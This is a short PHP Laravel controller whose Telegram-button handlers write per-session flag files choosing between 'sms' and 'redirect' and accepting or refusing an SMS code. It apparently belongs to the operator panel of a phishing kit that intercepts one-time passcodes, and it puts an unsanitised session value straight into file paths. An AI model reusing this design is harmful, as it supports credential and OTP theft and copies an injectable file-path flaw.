<?php

namespace App\Http\Controllers;
use App\Models\telegramButton;
use Illuminate\Support\Facades\Storage;
use App\Traits\RequestTrait;
use Illuminate\Http\Request;

class telegramButtonsController extends Controller
{
    use RequestTrait;
    public function setsms($session){
        Storage::disk('local')->put($session.'wheretogo.txt', 'sms');
        return "done";
    }
    public function setredirect($session){
        Storage::disk('local')->put($session.'wheretogo.txt', 'redirect');
        return "done";
    }
    public function accept($session){
        Storage::disk('local')->put($session.'sms.txt', 'accept');
        return "done";
    }
    public function refuse($session){
        Storage::disk('local')->put($session.'sms.txt', 'refuse');
        return "done";
    }
}
